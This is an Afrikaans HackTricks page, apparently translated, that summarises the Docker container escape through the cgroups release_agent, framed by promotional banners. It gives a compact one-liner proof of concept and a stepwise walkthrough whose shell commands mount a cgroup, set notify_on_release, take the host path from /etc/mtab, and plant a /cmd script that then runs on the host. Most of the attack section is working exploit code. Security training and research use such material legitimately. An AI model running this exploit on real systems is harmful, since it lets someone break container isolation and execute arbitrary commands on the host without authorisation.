# Docker release_agent cgroups ontsnapping

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>


**Vir verdere besonderhede, verwys na die [oorspronklike blogpos](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** Hierdie is net 'n opsomming:

Oorspronklike PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Die bewys van konsep (PoC) demonstreer 'n metode om cgroups uit te buit deur 'n `release_agent` lêer te skep en sy aanroeping te veroorsaak om willekeurige opdragte op die houer-gashouer uit te voer. Hier is 'n ontleding van die stappe wat betrokke is:

1. **Berei die omgewing voor:**
- 'n Gids `/tmp/cgrp` word geskep om as 'n koppelvlakpunt vir die cgroup te dien.
- Die RDMA cgroup-beheerder word aan hierdie gids gekoppel. In die geval van die afwesigheid van die RDMA-beheerder, word dit voorgestel om die `memory` cgroup-beheerder as 'n alternatief te gebruik.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Stel die Kind Cgroup op:**
- 'n Kind Cgroup genaamd "x" word binne die gemonteerde cgroup-gids geskep.
- Kennisgewings word geaktiveer vir die "x" cgroup deur 1 na sy notify_on_release-lêer te skryf.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Stel die Vrylatingsagent in:**
- Die pad van die houer op die gasheer word verkry uit die /etc/mtab-lêer.
- Die release_agent-lêer van die cgroup word dan ingestel om 'n skripsie genaamd /cmd uit te voer wat geleë is op die verkryde gasheerpad.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Skep en konfigureer die /cmd-skrip:**
- Die /cmd-skrip word binne die houer geskep en gekonfigureer om ps aux uit te voer, waar die uitset na 'n lêernaam /output in die houer omgelei word. Die volledige pad van /output op die gasheer word gespesifiseer.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Trigger die Aanval:**
- 'n Proses word geïnisieer binne die "x" kind cgroup en word onmiddellik beëindig.
- Dit trigger die `release_agent` (die /cmd skrip), wat ps aux op die gasheer uitvoer en die uitset na /output binne die houer skryf.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslagplekke.

</details>
